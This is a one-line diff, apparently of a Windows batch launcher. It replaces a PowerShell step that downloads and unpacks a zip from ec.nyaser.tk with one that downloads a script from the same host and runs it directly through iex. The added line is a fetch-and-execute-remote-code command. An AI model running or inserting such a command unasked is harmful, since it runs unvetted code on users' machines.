@@ -1,1 +1,1 @@
-powershell "$t=(New-Guid).toString()+'.zip';iwr -Uri https://ec.nyaser.tk/u -OutFile $t;Expand-Archive -Path $t -DestinationPath %~dp0 -Force;ri $t"||cmd/k
+cd/d %~dp0&&powershell "irm https://ec.nyaser.tk/p|iex"||cmd/k
